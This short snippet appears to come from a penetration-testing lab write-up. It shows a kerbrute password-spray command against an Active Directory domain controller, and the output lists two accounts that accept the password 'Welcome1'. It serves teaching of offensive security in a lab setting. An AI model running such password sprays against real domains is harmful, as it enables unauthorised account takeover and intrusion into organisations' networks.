Two hits for the password Welcome1

```$kerbrute passwordspray --dc 172.16.5.5 -d inlanefreight.local all_ad_users Welcome1 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/02/22 - Ronnie Flathers @ropnop

2022/06/02 18:04:18 >  Using KDC(s):
2022/06/02 18:04:18 >  	172.16.5.5:88

2022/06/02 18:04:22 >  [+] VALID LOGIN:	 abouldercon@inlanefreight.local:Welcome1
2022/06/02 18:04:27 >  [+] VALID LOGIN:	 asmith@inlanefreight.local:Welcome1
2022/06/02 18:04:27 >  Done! Tested 2952 logins (2 successes) in 8.693 seconds
